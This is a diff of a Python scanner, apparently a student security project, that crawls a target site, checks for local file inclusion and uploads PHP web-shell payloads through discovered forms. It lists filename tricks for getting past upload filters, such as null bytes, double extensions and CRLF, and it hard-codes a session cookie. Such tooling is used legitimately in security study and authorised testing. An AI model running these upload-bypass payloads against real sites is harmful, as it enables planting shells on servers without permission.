@@ -13,7 +13,7 @@ import uploadv2
 URL = "http://ict2214p1b2.mooo.com/"
 UPLOAD_DIR_WORDLIST = "upload_dir_wordlist.txt"
 WORDLIST = "wordlists/test"
-COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"}
+COOKIE = {"PHPSESSID": "nigm2pdtrjo5dfc82n8gdiv2l5"}
 
 # PAYLOAD_FILENAME = "malicious.php"
 REPORT_FILENAME = "vuln_report.txt"
@@ -24,20 +24,20 @@ PAYLOAD_FILENAMES = [
     "shell.php.jpg",
     "shell.pHp5",
     "shell.png.php",
-    "shell.php#.png",
-    "shell.php%20",
-    "shell.phpJunk123png",
-    "shell.png.jpg.php",
-    "shell.php%00.png",
-    "shell.php...",
-    "shell.php.png",
-    "shell.asp::$data",
-    "A" * 232 + ".php",
-    "A" * 232 + ".png",
-    "shell.php%0a",
-    "shell.php%00",
-    "shell.php%0d%0a",
-    "shell.php%00.png%00.jpg",
+    # "shell.php#.png",
+    # "shell.php%20",
+    # "shell.phpJunk123png",
+    # "shell.png.jpg.php",
+    # "shell.php%00.png",
+    # "shell.php...",
+    # "shell.php.png",
+    # "shell.asp::$data",
+    # "A" * 232 + ".php",
+    # "A" * 232 + ".png",
+    # "shell.php%0a",
+    # "shell.php%00",
+    # "shell.php%0d%0a",
+    # "shell.php%00.png%00.jpg",
 ]
 
 
@@ -92,6 +92,9 @@ def main():
     print("\nPotential LFI vulnerabilities:")
     lfi_targets = crawler.check_lfi(found_urls)
 
+    form_details = crawler.get_form_details(URL, uploadable_urls, session, COOKIE)
+    # form_action_urls = crawler.get_form_action_urls(URL ,uploadable_urls, session, COOKIE)
+
     lfi_confirmed_targets = set()
     for target in lfi_targets:
         print(target)
@@ -116,13 +119,22 @@ def main():
     uploaded_files = []
     failed_files = []
 
-    for url in uploadable_urls:
+    for form in form_details:
+        form_action_url = form["action"]
         for payload in generated_payloads:
-            if uploadv2.upload_file(url, payload, COOKIE, CONTENT_TYPE_FILE):
-                print(f"[+] File uploaded successfully: {payload} -> {url}")
-                uploaded_files.append(url + "/" + payload)
+            if uploadv2.upload_file(payload, form_action_url, COOKIE, form, CONTENT_TYPE_FILE):
+                print(f"[+] File uploaded successfully: {payload} -> {form_action_url}")
+                uploaded_files.append(payload)
             else:
                 failed_files.append(payload)
+
+    # for url in form_action_urls:
+    #     for payload in generated_payloads:
+    #         if uploadv2.upload_file(url, payload, COOKIE, CONTENT_TYPE_FILE):
+    #             print(f"[+] File uploaded successfully: {payload} -> {url}")
+    #             uploaded_files.append(payload)
+    #         else:
+    #             failed_files.append(payload)
 
     # 🔹 Step 6: Detect upload directory
     dynamic_upload_dir = uploadv2.get_upload_directory(
